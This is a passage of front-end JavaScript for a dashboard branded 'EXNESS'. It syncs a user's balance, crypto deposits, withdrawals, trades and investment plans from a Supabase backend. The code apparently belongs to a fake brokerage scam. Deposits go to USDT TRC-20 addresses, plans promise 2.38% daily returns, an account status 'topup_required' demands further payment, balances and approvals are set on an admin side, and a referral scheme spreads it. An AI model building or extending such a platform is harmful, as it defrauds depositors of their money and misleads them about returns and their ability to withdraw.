            carCard.style.removeProperty('display');
            document.querySelectorAll('[data-car-model]').forEach((el) => el.textContent = order.model);
            document.querySelectorAll('[data-car-order-number]').forEach((el) => el.textContent = `Order #${order.orderNumber}`);
            document.querySelectorAll('[data-car-price]').forEach((el) => el.textContent = formatUSD(order.price));
            document.querySelectorAll('[data-car-vin]').forEach((el) => el.textContent = order.vin);
        } else {
            carCard.hidden = true;
        }
    }

    // Dynamic Referral Link
    function hydrateReferralLink(user) {
        const input = document.querySelector('[data-referral-input]');
        if (!input) return;

        const code = (user.user_metadata?.username || user.id.slice(0, 8)).toUpperCase();
        const link = `${window.location.origin}/register.html?ref=${code}`;
        input.value = link;
        input.readOnly = true;

        const copyBtn = document.querySelector('[data-referral-copy]');
        if (copyBtn) {
            copyBtn.disabled = false;
            copyBtn.onclick = () => {
                navigator.clipboard.writeText(link);
                showAppleToast('Referral link copied to clipboard!');
            };
        }
    }

    // Setup forms across dashboard
    function setupPageForms() {
        // 1. DEPOSIT PAGE
        const depositForm = document.querySelector('[data-deposit-form]');
        if (depositForm) {
            depositForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const amountInput = depositForm.querySelector('[name="depositAmount"]') || depositForm.querySelector('input[type="number"]');
                const asset = depositForm.dataset.selectedAsset || 'USDT';
                const network = depositForm.dataset.selectedNetwork || 'TRC-20';
                const address = depositForm.dataset.selectedAddress || '';
                const amount = amountInput ? amountInput.value : 0;

                if (brokerAccount.deposit({ amount, asset, network, address })) {
                    if (amountInput) amountInput.value = '';
                    const successBox = document.querySelector('[data-deposit-success]');
                    if (successBox) {
                        successBox.hidden = false;
                        setTimeout(() => successBox.hidden = true, 5000);
                    }
                }
            });
        }

        // 2. WITHDRAW PAGE
        const withdrawForm = document.querySelector('form[data-withdraw-form]');
        if (withdrawForm) {
            withdrawForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const amount = withdrawForm.querySelector('input[type="number"]')?.value;
                const network = withdrawForm.querySelector('select')?.value || 'USDT (TRC-20)';
                const address = withdrawForm.querySelector('input[type="text"]')?.value || '';

                if (brokerAccount.withdraw({ amount, network, address })) {
                    withdrawForm.reset();
                    const successAlert = document.querySelector('[data-withdraw-success]');
                    if (successAlert) {
                        successAlert.hidden = false;
                        setTimeout(() => successAlert.hidden = true, 5000);
                    }
                }
            });
        }

        // 3. TRADES PAGE
        const tradeForm = document.querySelector('form[data-trade-form]');
        if (tradeForm) {
            tradeForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const amount = tradeForm.querySelector('input[type="number"]')?.value;
                const side = tradeForm.dataset.side || 'buy';
                const leverage = tradeForm.dataset.leverage || '1x';
                const symbol = 'TSLA';

                if (brokerAccount.trade({ symbol, side, amount, leverage })) {
                    tradeForm.reset();
                }
            });
        }

        // 4. INVESTMENTS PAGE
        document.querySelectorAll('[data-subscribe-plan]').forEach((btn) => {
            btn.addEventListener('click', () => {
                const planName = btn.dataset.planName || 'Gold Arbitrage';
                const capital = parseFloat(btn.dataset.planCapital) || 5000;
                const rate = parseFloat(btn.dataset.planRate) || 2.38;
                brokerAccount.invest({ planName, capital, dailyRate: rate, durationDays: 21 });
            });
        });
    }

    function setupProfileForm(user) {
        const form = document.querySelector('[data-profile-form]');
        if (!form) return;

        form.addEventListener('submit', async (event) => {
            event.preventDefault();
            const submit = form.querySelector('button[type="submit"]');
            if (submit) submit.disabled = true;

            const username = form.querySelector('[data-auth-username]')?.value.trim() || '';
            const fullName = form.querySelector('[data-auth-name]')?.value.trim() || '';
            const phone = form.querySelector('[data-auth-phone]')?.value.trim() || '';

            const { data, error } = await client.auth.updateUser({
                data: {
                    username: username,
                    full_name: fullName,
                    phone: phone,
                    account_data: currentAccountData
                }
            });

            if (error) {
                showAppleToast(error.message, 'error');
            } else if (data.user) {
                currentUser = data.user;
                hydrateUI();
                showAppleToast('Profile updated successfully!');
                const saved = document.querySelector('[data-profile-saved]');
                if (saved) {
                    saved.hidden = false;
                    setTimeout(() => saved.hidden = true, 3000);
                }
            }
            if (submit) submit.disabled = false;
        });
    }

    function setupLogoutLinks() {
        const links = document.querySelectorAll('[data-logout-link]');
        if (!links.length) return;

        let dialog = document.querySelector('[data-logout-dialog]');
        if (!dialog) {
            dialog = document.createElement('div');
            dialog.setAttribute('data-logout-dialog', '');
            dialog.hidden = true;
            dialog.innerHTML = `
                <div class="logout-dialog-backdrop" data-logout-cancel></div>
                <div class="logout-dialog-sheet" role="dialog" aria-modal="true" aria-labelledby="logout-dialog-title">
                    <div class="logout-dialog-icon"><i data-lucide="log-out"></i></div>
                    <h2 id="logout-dialog-title">Log out of EXNESS?</h2>
                    <p>Your current session will end on this device.</p>
                    <div class="logout-dialog-actions">
                        <button type="button" data-logout-confirm>Log out</button>
                        <button type="button" data-logout-cancel>Cancel</button>
                    </div>
                </div>`;
            document.body.appendChild(dialog);
            if (window.lucide) window.lucide.createIcons();
        }

        const close = () => {
            dialog.classList.add('logout-closing');
            dialog.addEventListener('animationend', function handler() {
                dialog.removeEventListener('animationend', handler);
                dialog.hidden = true;
                dialog.classList.remove('logout-closing');
            });
        };
        const open = (event) => {
            event.preventDefault();
            dialog.classList.remove('logout-closing');
            dialog.hidden = false;
        };

        links.forEach((link) => link.addEventListener('click', open));
        dialog.querySelectorAll('[data-logout-cancel]').forEach((button) => button.addEventListener('click', close));
        dialog.querySelector('[data-logout-confirm]')?.addEventListener('click', async (event) => {
            const button = event.currentTarget;
            button.disabled = true;
            button.textContent = 'Logging out...';
            await client.auth.signOut();
            window.location.assign('../index.html');
        });
    }

    function setupAvatarPicker(user) {
        const input = document.querySelector('[data-avatar-input]');
        if (!input) return;

        input.addEventListener('change', () => {
            const file = input.files?.[0];
            if (!file || !file.type.startsWith('image/')) return;
            if (file.size > 2 * 1024 * 1024) {
                showAppleToast('Please choose an image smaller than 2 MB', 'error');
                input.value = '';
                return;
            }

            const reader = new FileReader();
            reader.onload = () => {
                localStorage.setItem(avatarStorageKey(user), reader.result);
                hydrateUI();
                showAppleToast('Profile photo updated!');
            };
            reader.readAsDataURL(file);
        });
    }

    function pushAdminDecisionNotification(type, amount, decision, sourceId) {
        if (!currentAccountData) return;

        const normalizedDecision = String(decision || '').toLowerCase();
        const approved = normalizedDecision === 'approved' || normalizedDecision === 'confirmed' || normalizedDecision === 'processed';
        const title = approved ? `${type.charAt(0).toUpperCase() + type.slice(1)} approved` : `${type.charAt(0).toUpperCase() + type.slice(1)} declined`;
        const detail = approved
            ? `Your ${type} has been approved.`
            : `Your ${type} has been declined.`;

        const existing = (currentAccountData.notifications || []).some((item) => item.sourceId === sourceId);
        if (existing) return;

        currentAccountData.notifications.unshift({
            id: `notif_${Date.now()}_${Math.random().toString(16).slice(2)}`,
            title,
            detail,
            icon: approved ? 'check-circle' : 'x-circle',
            time: 'Just now',
            unread: true,
            sourceId
        });

        showAppleToast(detail, approved ? 'success' : 'error');
        persistAccountData();
        hydrateUI();
    }

    function updateTransactionStatus(txid, status) {
        if (!currentAccountData || !txid) return;

        currentAccountData.transactions
            .filter((transaction) => transaction.txid === txid)
            .forEach((transaction) => {
                transaction.status = status;
            });
    }

    function normalizeTransactionStatus(status) {
        const normalized = String(status || '').toLowerCase();
        if (['confirmed', 'processed', 'completed', 'settled', 'active'].includes(normalized)) return 'Confirmed';
        if (['rejected', 'declined', 'failed', 'cancelled', 'canceled'].includes(normalized)) return 'Declined';
        return 'Pending';
    }

    function syncDatabaseTransactions(transactions) {
        if (!currentAccountData || !Array.isArray(transactions)) return;

        const remoteTxids = new Set(transactions.map((transaction) => transaction.txid));
        const remoteTransactions = transactions.map((transaction) => ({
            id: transaction.id,
            txid: transaction.txid,
            type: transaction.type,
            asset: transaction.asset,
            amount: Number(transaction.amount) || 0,
            fee: Number(transaction.fee) || 0,
            formattedAmount: `${transaction.is_positive ? '+' : '-'}${formatUSD(transaction.amount)}`,
            date: `${formatDate(transaction.created_at)} · ${formatTime(transaction.created_at)}`,
            status: normalizeTransactionStatus(transaction.status),
            isPositive: Boolean(transaction.is_positive)
        }));
        const localOnlyTransactions = (currentAccountData.transactions || []).filter((transaction) => !remoteTxids.has(transaction.txid));
        currentAccountData.transactions = [...remoteTransactions, ...localOnlyTransactions]
            .sort((first, second) => new Date(second.date.replace(' · ', ' ')) - new Date(first.date.replace(' · ', ' ')));
    }

    async function syncLiveAccountState() {
        if (!currentUser || !client) return;

        try {
            const { data: profile, error: profileErr } = await client
                .from('profiles')
                .select('balance, status, total_withdrawn, active_invest, total_profit, updated_at')
                .eq('id', currentUser.id)
                .maybeSingle();

            if (!profileErr && profile) {
                const latestBalance = Number(profile.balance) || 0;
                if (Number(currentAccountData?.balance || 0) !== latestBalance) {
                    currentAccountData.balance = latestBalance;
                }
                if (typeof profile.total_withdrawn !== 'undefined') {
                    currentAccountData.totalWithdrawn = Number(profile.total_withdrawn) || 0;
                }
                if (typeof profile.active_invest !== 'undefined') {
                    currentAccountData.activeInvest = Number(profile.active_invest) || 0;
                }
                if (typeof profile.total_profit !== 'undefined') {
                    currentAccountData.totalProfit = Number(profile.total_profit) || 0;
                }

                const nextStatus = String(profile.status || 'active').toLowerCase() === 'suspended';
                const nextTopUpStatus = String(profile.status || 'active').toLowerCase() === 'topup_required';
                if (accountSuspended !== nextStatus) {
                    accountSuspended = nextStatus;
                }
                if (accountTopUpRequired !== nextTopUpStatus) {
                    accountTopUpRequired = nextTopUpStatus;
                }

                updateSuspendedStatusUI();
                persistAccountData();
                hydrateUI();
            }

            const { data: transactions, error: transactionsErr } = await client
                .from('transactions')
                .select('id, txid, type, asset, amount, fee, status, is_positive, created_at')
                .eq('user_id', currentUser.id)
                .order('created_at', { ascending: false });

            if (!transactionsErr && transactions) {
                syncDatabaseTransactions(transactions);
                hydrateUI();
            }

            const { data: deposits, error: depositErr } = await client
                .from('deposits')
                .select('*')
                .eq('user_id', currentUser.id)
                .order('created_at', { ascending: false });

            if (!depositErr && deposits) {
                const mappedDeposits = deposits.map((d) => ({
                    id: d.id,
                    txid: d.txid,
                    amount: Number(d.amount) || 0,
                    asset: d.asset || 'USDT',
                    network: d.network || 'TRC-20',
                    address: d.address || '',
                    date: d.created_at,
                    status: d.status === 'confirmed' ? 'Confirmed' : d.status === 'pending' ? 'Pending' : d.status === 'rejected' ? 'Rejected' : d.status || 'Pending'
                }));

                const priorDeposits = currentAccountData.deposits || [];
                mappedDeposits.forEach((deposit) => {
                    const currentStatus = String(deposit.status || '').toLowerCase();
                    updateTransactionStatus(deposit.txid, normalizeTransactionStatus(currentStatus));

                    const previous = priorDeposits.find((item) => item.txid === deposit.txid || item.id === deposit.id);
                    if (!previous) return;

                    const previousStatus = String(previous.status || '').toLowerCase();
                    if (previousStatus !== currentStatus && previousStatus === 'pending') {
                        if (currentStatus === 'confirmed' || currentStatus === 'processed') {
                            pushAdminDecisionNotification('deposit', Number(deposit.amount) || 0, 'approved', `deposit:${deposit.id}`);
                        } else if (currentStatus === 'rejected') {
                            pushAdminDecisionNotification('deposit', Number(deposit.amount) || 0, 'declined', `deposit:${deposit.id}`);
                        }
                    }
                });

                currentAccountData.deposits = mappedDeposits;
            }

            const { data: withdrawals, error: withdrawalErr } = await client
                .from('withdrawals')
                .select('*')
                .eq('user_id', currentUser.id)
                .order('created_at', { ascending: false });

            if (!withdrawalErr && withdrawals) {
                const mappedWithdrawals = withdrawals.map((w) => ({
                    id: w.id,
                    txid: w.txid,
                    amount: Number(w.amount) || 0,
                    fee: Number(w.fee) || 0,
                    netAmount: Number(w.net_amount) || 0,
                    network: w.network || 'USDT (TRC-20)',
                    address: w.address || '',
                    date: w.created_at,
                    status: w.status === 'processed' ? 'Processed' : w.status === 'pending' ? 'Pending' : w.status === 'rejected' ? 'Rejected' : w.status || 'Pending'
                }));

                const priorWithdrawals = currentAccountData.withdrawals || [];
                mappedWithdrawals.forEach((withdrawal) => {
                    updateTransactionStatus(withdrawal.txid, normalizeTransactionStatus(withdrawal.status));
                    const previous = priorWithdrawals.find((item) => item.txid === withdrawal.txid || item.id === withdrawal.id);
                    if (!previous) return;

                    const previousStatus = String(previous.status || '').toLowerCase();
                    const currentStatus = String(withdrawal.status || '').toLowerCase();
                    if (previousStatus !== currentStatus && previousStatus === 'pending') {
                        if (currentStatus === 'confirmed' || currentStatus === 'processed') {
                            pushAdminDecisionNotification('withdrawal', Number(withdrawal.amount) || 0, 'approved', `withdrawal:${withdrawal.id}`);
                        } else if (currentStatus === 'rejected') {
                            pushAdminDecisionNotification('withdrawal', Number(withdrawal.amount) || 0, 'declined', `withdrawal:${withdrawal.id}`);
                        }
                    }
                });

                currentAccountData.withdrawals = mappedWithdrawals;
            }
        } catch (err) {
            console.warn('Live account sync failed:', err);
        }
    }

    function startLiveAccountSync() {
        if (window.__brokerLiveSyncInterval) return;
        window.__brokerLiveSyncInterval = window.setInterval(() => {
            if (document.visibilityState === 'visible') {
                syncLiveAccountState();
            }
        }, 5000);
    }

    async function init() {
        const { data, error } = await client.auth.getSession();
        if (error || !data.session) {
            window.location.replace('../login.html');
            return;
        }

        currentUser = data.session.user;
        window.currentSupabaseUser = currentUser;

        try {
            const { data: profileData, error: profileError } = await client
                .from('profiles')
                .select('status, role')
                .eq('id', currentUser.id)
                .maybeSingle();

            if (!profileError && profileData) {
                accountSuspended = String(profileData.status || 'active').toLowerCase() === 'suspended';
                accountTopUpRequired = String(profileData.status || 'active').toLowerCase() === 'topup_required';
                accountTopUpRequired = String(profileData.status || 'active').toLowerCase() === 'topup_required';
            }
        } catch (statusErr) {
            console.warn('Suspension status lookup failed:', statusErr);
        }

        // Load and sync user account data
        loadAccountData(currentUser);
        startLiveAccountSync();

        // Hydrate DOM
        hydrateUI();
        setupProfileForm(currentUser);
        setupAvatarPicker(currentUser);
        setupLogoutLinks();
        setupPageForms();

        client.auth.onAuthStateChange(async (_event, session) => {
            if (!session) {
                window.location.replace('../login.html');
                return;
            }
            currentUser = session.user;
            window.currentSupabaseUser = session.user;

            try {
                const { data: profileData, error: profileError } = await client
                    .from('profiles')
                    .select('status, role')
                    .eq('id', currentUser.id)
                    .maybeSingle();

                if (!profileError && profileData) {
                    accountSuspended = String(profileData.status || 'active').toLowerCase() === 'suspended';
                }
            } catch (statusErr) {
                console.warn('Suspension status lookup failed:', statusErr);
            }

            loadAccountData(session.user);
            hydrateUI();
        });
    }

    document.addEventListener('DOMContentLoaded', init);
})();
